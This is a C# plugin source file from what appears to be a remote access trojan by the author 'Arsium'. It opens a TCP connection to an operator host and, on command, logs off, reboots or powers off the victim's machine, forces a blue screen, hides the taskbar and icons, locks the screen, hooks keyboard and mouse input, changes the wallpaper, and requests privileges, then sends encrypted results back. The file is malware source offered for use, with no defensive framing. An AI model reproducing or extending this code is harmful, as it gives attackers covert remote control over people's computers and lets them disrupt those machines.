using Shared;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            byte[] b;
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case Shared.PacketTypes.PacketType.LOG_OUT_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_LOGOFF, 0));
                        break;

                    case Shared.PacketTypes.PacketType.REBOOT_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_REBOOT, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MINOR_BLUESCREEN));
                        break;

                    case Shared.PacketTypes.PacketType.POWER_OFF_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_POWEROFF, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MAJOR_SOFTWARE));
                        break;

                    case PacketTypes.PacketType.SUSPEND_SYS:
                        await Task.Run(() => Functions.Suspend());
                        break;

                    case PacketTypes.PacketType.HIBERNATE_SYS:
                        await Task.Run(() => Functions.Hibernate());
                        break;

                    case Shared.PacketTypes.PacketType.HIDE_DI:
                        await Task.Run(() => Functions.DesktopIcons(false));
                        break;

                    case Shared.PacketTypes.PacketType.SHOW_DI:
                        await Task.Run(() => Functions.DesktopIcons(true));
                        break;

                    case Shared.PacketTypes.PacketType.HIDE_TB:
                        await Task.Run(() => Functions.TaskBar(0));
                        break;

                    case Shared.PacketTypes.PacketType.SHOW_TB:
                        await Task.Run(() => Functions.TaskBar(1));
                        break;

                    case PacketTypes.PacketType.SCRL_ON:
                        await Task.Run(() => Functions.StartScreenLocker());
                        break;

                    case PacketTypes.PacketType.SRCL_OFF:
                        await Task.Run(() => Functions.StopScreenLocker());
                        break;

                    case Shared.PacketTypes.PacketType.BSOD_SYS:
                        await Task.Run(() => Functions.BSOD());
                        break;

                    case PacketTypes.PacketType.KB_ON:
                        await Task.Run(() => Functions.UnhookKeyboard());
                        break;

                    case PacketTypes.PacketType.KB_OFF:
                        await Task.Run(() => Functions.HookKeyboard());
                        break;

                    case PacketTypes.PacketType.MS_ON:
                        await Task.Run(() => Functions.UnhookMouse());
                        break;

                    case PacketTypes.PacketType.MS_OFF:
                        await Task.Run(() => Functions.HookMouse());
                        break;

                    case PacketTypes.PacketType.SET_DESK_WP:
                        b = (byte[])Param[1];
                        await Task.Run(() => Functions.SetWallPaper(b , Param[2].ToString()));
                        break;

                    case PacketTypes.PacketType.GET_PRIV:
                        await Task.Run(() => Functions.GetPrivilege((int)Param[1], ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.GET_PRIV;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;
                }
                S.Close();
                S.Dispose();
            }
            catch (Exception)
            {
            }
            finally
            {
                Shared.Utils.ClearMem();
            }       
        }
    }
}
